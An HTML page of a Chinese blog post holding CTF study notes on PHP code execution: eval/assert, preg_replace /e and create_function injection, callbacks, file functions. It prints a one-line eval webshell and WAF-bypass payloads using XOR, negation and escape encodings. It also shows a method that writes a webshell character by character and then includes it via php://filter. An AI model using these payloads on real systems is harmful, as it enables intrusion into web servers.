<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="mayylu">



    <meta name="description" content="学习是一种生活态度">



<title>php代码执行 | mayylu&#39;s blog</title>



    <link rel="icon" href="/vue.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 5.4.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">php代码执行</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">九月 10, 2022&nbsp;&nbsp;</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/php/">php</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要借ctf中eval函数的利用记录以下php语句特点和web木马的构造</p>
<span id="more"></span>
<h2 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?</span> <span class="meta">?&gt;</span>相当于<span class="meta">&lt;?php</span> <span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?=</span> <span class="meta">?&gt;</span>相当于<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;&lt;/script&gt;<span class="comment">//实测php5可以，但是php7就不支持了</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="string">&quot;1&quot;</span><span class="meta">?&gt;</span>	    <span class="comment">//相当于<span class="meta">&lt;?php</span> echo &quot;1&quot;;<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;?</span><span class="keyword">echo</span><span class="string">&quot;1&quot;</span><span class="meta">?&gt;</span>     <span class="comment">//前提是开启配置参数short_open_tags=on(默认值是 on)</span></span><br><span class="line">&lt;% <span class="keyword">echo</span><span class="string">&quot;1&quot;</span>;%&gt;	<span class="comment">//前提是开启配置参数asp_tags=on(默认值是 Off)，php7.0及以上版本不能使用</span></span><br></pre></td></tr></table></figure>
<h2 id="php–代码执行"><a href="#php–代码执行" class="headerlink" title="php–代码执行"></a>php–代码执行</h2><h3 id="php代码执行函数"><a href="#php代码执行函数" class="headerlink" title="php代码执行函数"></a>php代码执行函数</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h4><p>eval是一个语言构造器，并不是系统组件函数，不能被 可变函数 调用。因此我们在php.ini中使用disable_functions是无法禁止它的,只有使用插件才能禁用。因此一般我们的一句话木马一般都写成<code>&lt;?php eval($_POST[&#39;1&#39;]);</code>而不是<code>&lt;?php$_POST[&#39;1&#39;]($_POST[&#39;2&#39;]);</code><br>eval() 函数把字符串按照 PHP 代码来计算且只能执行一次,该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p>
<h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><p>编写代码时，我们总是会做出一些假设，断言就是用于在代码中捕捉这些假设，可以将断言看作是异常处理的一种高级形式。程序员断言在程序中的某个特定点该的表达式值为真(为真才能继续执行)。如果该表达式为假，就中断操作. 版本在PHP7以下是函数 PHP7及以上为语法结构,<strong>php7.1</strong>以后就只能用eval了 assert默认没有执行功能了<br><code>assert ( mixed $assertion [, Throwable $exception ] );</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot; phpinfo()&quot;); &lt;错误&gt;</span><br><span class="line"></span><br><span class="line">eval(&quot; phpinfo();&quot;); &lt;正确&gt;</span><br><span class="line">assert(&quot; phpinfo()&quot;); &lt;正确&gt;</span><br></pre></td></tr></table></figure>
<h4 id="preg-replace-e代码执行漏洞"><a href="#preg-replace-e代码执行漏洞" class="headerlink" title="preg_replace() /e代码执行漏洞"></a>preg_replace() /e代码执行漏洞</h4><p>preg_replace($pattern, $replacement, $subject),搜索 subject 中匹配 pattern 的部分，以 replacement 进行替换,如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串.<br>(如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。)</p>
<p>正则表达式中的/e模式的作用是将<strong>替换串</strong>中的内容当作代码来执行，/e模式是php语言才有的，除此之外还有/i(不区分大小写)等。php5.5废除preg_replace的/e模式(不是移除)当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、  和 NULL) 而后进行后向引用替换.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">function test($str)&#123; .......&#125;</span><br><span class="line">echo preg_replace(&quot;/s*[php](.+?)[/php]s*/ies&quot;, &#x27;test(&quot;\1&quot;)&#x27;, $_GET[&quot;h&quot;]);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>在php中，<strong>双引号</strong>里面如果包含有变量，php解释器会将其替换为变量解释后的结果；<strong>单引号</strong>中的变量不会被处理。<br>我们如果提交<code>?h=[php]&#123;$&#123;phpinfo()&#125;&#125;[/php],replacement </code>参数变为<code>test(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)</code>,phpinfo()就会被执行</p>
<h4 id="create-function-此函数在内部执行-eval-，已在-PHP-7-2-0-起被废弃"><a href="#create-function-此函数在内部执行-eval-，已在-PHP-7-2-0-起被废弃" class="headerlink" title="create_function(此函数在内部执行 eval()，已在 PHP 7.2.0 起被废弃)"></a>create_function(此函数在内部执行 eval()，已在 PHP 7.2.0 起被废弃)</h4><p>创建一个匿名（lambda样式）函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数构造</span></span><br><span class="line">create_function(<span class="string">&#x27;$fname&#x27;</span>,<span class="string">&#x27;echo $fname.&quot;Zhang&quot;&#x27;</span>)</span><br><span class="line"><span class="comment">//等价于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$fname</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fname</span>.<span class="string">&quot;Zhang&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>1.系统就会寻找闭合的引号，此时引号内的注释符等会忽略；<br>2.系统寻找逗号；<br>3.系统寻找一对单/双引号；<br>4.系统寻找)和;。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一个参数的利用</span></span><br><span class="line"><span class="variable">$a</span> = )&#123;&#125;system(“dir”);<span class="comment">//  create_function($a,’’);	-&gt; function lambda_15(   )&#123;&#125;system(&#x27;ls&#x27;); //) &#123;&#125;</span></span><br><span class="line"><span class="comment">//第二个参数的利用</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;&#125;phpinfo();<span class="comment">//        create_function(&#x27;&#x27;,&#x27;echo.$a.;&#x27;)    -&gt;function lambda_15()&#123;echo&#x27;&#x27;;&#125;phpinfo();  // ;&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h4><ol>
<li>call_user_func<br><code>call_user_func(callable $callback, mixed ...$args): mixed</code><br>callback<br>将被调用的回调函数<br>args<br>0个或以上的参数，被传入回调函数。<br>call_user_func(‘assert’, ‘phpinfo();’);<br>call_user_func(‘extract’, array);传入一个数组<strong>作为参数</strong></li>
</ol>
<p>call_user_func(array(<strong>NAMESPACE</strong> .’\Foo’, ‘test’));<br>当传入的参数，是一个数组，且数组的第一个值是一个类的名字，或一个对象，那么，就会把数组的第二个值，当做方法，然后执行。</p>
<ol start="2">
<li><p>call_user_func_array<br>同call_user_func 可传入一个数组<strong>带入多个参数</strong>调用函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array (<span class="string">&#x27;file_put_contents&#x27;</span>, [<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;6666&#x27;</span>]);</span><br><span class="line"><span class="variable">$vars</span>[<span class="number">0</span>]=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$vars</span>[<span class="number">1</span>][]=<span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">call_user_func_array(<span class="variable">$vars</span>[<span class="number">0</span>],<span class="variable">$vars</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> foo;</span><br><span class="line">call_user_func_array(<span class="keyword">array</span>(<span class="variable">$foo</span>, <span class="string">&quot;bar&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;three&quot;</span>, <span class="string">&quot;four&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>array_map<br>为数组的<strong>每个元素</strong>应用回调函数<br><code>$a = [1, 2, 3, 4, 5];</code><br><code>array_map(&#39;cube&#39;, $a);</code><br>也可以多参<br><code>array_map(&#39;cube&#39;, $a，$b);</code></p>
</li>
<li><p>array_filter<br><code>array_filter($a, &quot;odd&quot;)</code><br>遍历 array 数组中的每个值，并将每个值传递给 callback 回调函数。 如果 callback 回调函数返回 true，则将 array 数组中的当前值返回到结果 array 数组中。 </p>
</li>
<li><p>array_walk_recursive<br><code>array_walk_recursive(array|object &amp;$array, callable $callback, mixed $arg = null): bool</code><br>array<br> 输入的数组。<br>callback<br> 典型情况下 callback 接受两个参数。array 参数的值作为第一个，键名作为第二个。<br>arg<br> 如果提供了可选参数 arg，将被作为第三个参数(整个)传递给callback。</p>
</li>
</ol>
<p>array_walk_recursive内部机制相关，会把第一个参数数组里面的值循环迭代传进去，第三个参数一直参加调用</p>
<h3 id="php文件操作"><a href="#php文件操作" class="headerlink" title="php文件操作"></a>php文件操作</h3><h4 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rmdir           <span class="comment">//删除目录</span></span><br><span class="line">​is_dir()        <span class="comment">//函数检查指定的文件是否是目录。</span></span><br><span class="line">getcwd()        <span class="comment">//同pwd</span></span><br><span class="line">mkdir           <span class="comment">//创建目录</span></span><br><span class="line">chdir           <span class="comment">//改变目录</span></span><br><span class="line">scandir(<span class="string">&quot;/&quot;</span>)    <span class="comment">//函数返回指定目录中的文件和目录的数组，$dir可以是相对路径，也可以是绝对路径</span></span><br></pre></td></tr></table></figure>
<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file  <span class="comment">//(临时上传文件路径,目标文件路径);//移动临时上传文件</span></span><br><span class="line">unlink              <span class="comment">//删除文件</span></span><br><span class="line">copy                <span class="comment">//复制文件copy($file, $newfile);</span></span><br><span class="line">file_exists()       <span class="comment">//函数检查文件或目录是否存在。</span></span><br></pre></td></tr></table></figure>
<h4 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents   <span class="comment">//将一个字符串写入文件file_put_contents(&quot;1.txt&quot;,&quot;6666&quot;);参数 data 也可以是数组（但不能是多维数组）</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = fopen(文件路径, <span class="string">&quot;w&quot;</span>);<span class="comment">//以写入模式打开一个文件 返回文件指针(不存在会自动创建)</span></span><br><span class="line">fwrite(<span class="variable">$fp</span>,写入字符串);<span class="comment">//写入数据</span></span><br><span class="line">fclose(<span class="variable">$fp</span>);<span class="comment">//关闭文件</span></span><br></pre></td></tr></table></figure>
<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents           <span class="comment">//读入文件返回字符串，echo file_get_contents(&quot;flag.txt&quot;); echo file_get_contents(&quot;https://www.bilibili.com/&quot;);</span></span><br><span class="line">readfile                    <span class="comment">//读取一个文件，写入到输出缓冲区，并返回从文件中读入的字节数</span></span><br><span class="line">file                        <span class="comment">//把整个文件读入一个数组中echo implode(&#x27;&#x27;, file(&#x27;https://www.bilibili.com/&#x27;));</span></span><br><span class="line">highlight_file/show_source  <span class="comment">//语法高亮一个文件highlight_file(&quot;1.php&quot;);</span></span><br><span class="line">parse_ini_file              <span class="comment">//读取并解析一个ini配置文件print_r(parse_ini_file(&#x27;1.ini&#x27;));</span></span><br><span class="line">simplexml_load_file         <span class="comment">//读取文件作为XML文档解析</span></span><br><span class="line"></span><br><span class="line">​fopen/fread/fgets/fgetss /fgetc/fgetcsv/fpassthru/fscanf<span class="comment">//打开文件或者 URL 读取文件流</span></span><br><span class="line"><span class="variable">$file</span> = fopen(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;r&quot;</span>); <span class="keyword">echo</span> fread(<span class="variable">$file</span>,<span class="string">&quot;1234&quot;</span>); fclose(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><p>print_r() 函数用于打印变量，以更容易理解的形式展示。<br>var_dump() 函数用于输出变量的相关信息。<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220715223832.png" alt="QQ截图20220715223832"></p>
<h4 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h4><p>unlink() 传入文件名删除文件 </p>
<h3 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h3><p>PHP7前是不允许用($a)()，即方法名不能被进一步解析<br>PHP7中增加了对此的支持</p>
<h4 id="字符串拼接绕过-PHP-gt-7"><a href="#字符串拼接绕过-PHP-gt-7" class="headerlink" title="字符串拼接绕过(PHP&gt;=7)"></a>字符串拼接绕过(<strong>PHP&gt;=7</strong>)</h4><p>在PHP中不一定需要引号(单引号/双引号)来表示字符串。PHP支持我们声明元素的类型，比如<code>$name = (string)mochu7</code>;，在这种情况下，$name就包含字符串”mochu7”，此外，如果不显示声明类型，那么PHP会将圆括号内的数据当成字符串来处理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">(sy.(st).em)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br><span class="line">.......</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="字符串转义绕过-php-gt-7"><a href="#字符串转义绕过-php-gt-7" class="headerlink" title="字符串转义绕过(php&gt;=7)"></a>字符串转义绕过(<strong>php&gt;=7</strong>)</h4><p>php默认字符串用<br>在php7中当<strong>字符串</strong>作为<strong>代码</strong>时,如果存在其中””,会先对其中的内容进行解析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">以十六进制的\x[0–9A-Fa-f]&#123;1,2&#125;转义字符表示法（如“\x41&quot;）</span><br><span class="line">&quot;\x70\x68\x70\x69\x6e\x66\x6f&quot;();                       #phpinfo();</span><br><span class="line"></span><br><span class="line">以Unicode表示的\u&#123;[0–9A-Fa-f]+&#125;字符，会输出为UTF-8字符串</span><br><span class="line">&quot;\u&#123;73&#125;\u&#123;79&#125;\u&#123;73&#125;\u&#123;74&#125;\u&#123;65&#125;\u&#123;6d&#125;&quot;(&#x27;id&#x27;);           #system(&#x27;id&#x27;);</span><br><span class="line"></span><br><span class="line">以八进制表示的\[0–7]&#123;1,3&#125;转义字符会自动适配byte（如&quot;\400&quot; == “\000”）</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&#x27;whoami&#x27;);                   #system(&#x27;whoami&#x27;);</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&quot;\167\150\157\141\155\151&quot;); #system(&#x27;whoami&#x27;);</span><br><span class="line">.......</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这种只支持将字符串当作参数传入到到eval中，即<code>eval($a)</code>，支持拼接，但不支持<code>eval($a($b))</code>这样的分参的形式;</p>
<h4 id="多次传参绕过"><a href="#多次传参绕过" class="headerlink" title="多次传参绕过"></a>多次传参绕过</h4><p>PHP的url参数的值可视为包裹在””的字符串,可以被进一步解析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eval($cmd)</span><br><span class="line">GET:</span><br><span class="line">?1=system&amp;2=whoami</span><br><span class="line">POST:</span><br><span class="line">cmd=$_GET[1]($_GET[2]);</span><br></pre></td></tr></table></figure>
<h4 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">其中%ff为字符ÿ</span><br><span class="line">$&#123;(&#x27;%00&#x27;^&#x27;%5f&#x27;).(&#x27;%07&#x27;^&#x27;%40&#x27;).(&#x27;%05&#x27;^&#x27;%40&#x27;).(&#x27;%09&#x27;^&#x27;%5d&#x27;)&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">//phpinfo()</span><br><span class="line"></span><br><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure>
<h4 id="取反绕过-php-gt-7"><a href="#取反绕过-php-gt-7" class="headerlink" title="取反绕过(php&gt;=7)"></a>取反绕过(<strong>php&gt;=7</strong>)</h4><p>PHP7前是不允许用($a)()，即方法名不能被进一步解析<br>PHP7中增加了对此的支持</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    var_dump(urlencode(~<span class="string">&quot;<span class="subst">$a</span>&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>(~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);</code><br><code> #system(&#39;whoami&#39;);</code></p>
<p><code>$_=(~&#39;%9E%8C%8C%9A%8D%8B&#39;);$__=&#39;_&#39;.(~&#39;%AF%B0%AC%AB&#39;);$___=$$__;$_($___[_]);</code><br><code>#assert($_POST[_]);</code></p>
<p>require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F))<br>require+伪协议实现任意文件读取</p>
<h4 id="利用php弱类型转化和自增"><a href="#利用php弱类型转化和自增" class="headerlink" title="利用php弱类型转化和自增"></a>利用php弱类型转化和自增</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//array(0) &#123;&#125;</span></span><br><span class="line"><span class="variable">$l</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$_</span>=([].[])[<span class="number">0</span>];<span class="comment">//Array</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=((<span class="number">0</span>/<span class="number">0</span>).[])[<span class="number">3</span>]; <span class="comment">//NAN</span></span><br><span class="line">var_dump(<span class="variable">$_</span>);</span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>/<span class="variable">$_</span>.<span class="variable">$_</span>)[<span class="number">0</span>]; <span class="comment">//N</span></span><br><span class="line"><span class="variable">$k</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="comment">//$__=$_.$_++; 时的$_=O $_.$_++; 这个顺序是（实验得出来的）：</span></span><br><span class="line">	<span class="comment">// 先使用 后自增 最后使用 $__=$_.O; -&gt; $_++ -&gt; $__=P.O;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=[].[];<span class="comment">//ArrayArray</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$%ff=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>];<span class="comment">//A</span></span><br><span class="line"></span><br><span class="line"><span class="comment">////ABCDEFGHIJKLMNOPKRSTUVWXYZ</span></span><br><span class="line"><span class="comment">////    1 1      1    11    1</span></span><br></pre></td></tr></table></figure>
<h3 id="长度绕过"><a href="#长度绕过" class="headerlink" title="长度绕过"></a>长度绕过</h3><p>值得注意的是在调用php数组时，若键为字母并且没有被引号包围的化，在编译器中提示错误，但运行时不会报错，<code>$_GET[aaaa]</code></p>
<h4 id="命令执行的利用"><a href="#命令执行的利用" class="headerlink" title="命令执行的利用"></a>命令执行的利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">param=`$_GET[1]`;&amp;1=bash</span><br><span class="line">param=exec($_GET[1]);</span><br></pre></td></tr></table></figure>
<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><ul>
<li>远程文件包含的利用</li>
<li>本地文件包含的利用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">param=$_GET[a](N,a,8);&amp;a=file_put_contents</span><br><span class="line">//利用file_put_contents可以将字符一个个地写入一个文件中</span><br><span class="line"></span><br><span class="line"># 每次写入一个字符：PD9waHAgZXZhbCgkX1BPU1RbOV0pOw</span><br><span class="line"># 最后包含</span><br><span class="line">param=include$_GET[0];&amp;0=php://filter/read=convert.base64-decode/resource=N</span><br></pre></td></tr></table></figure>
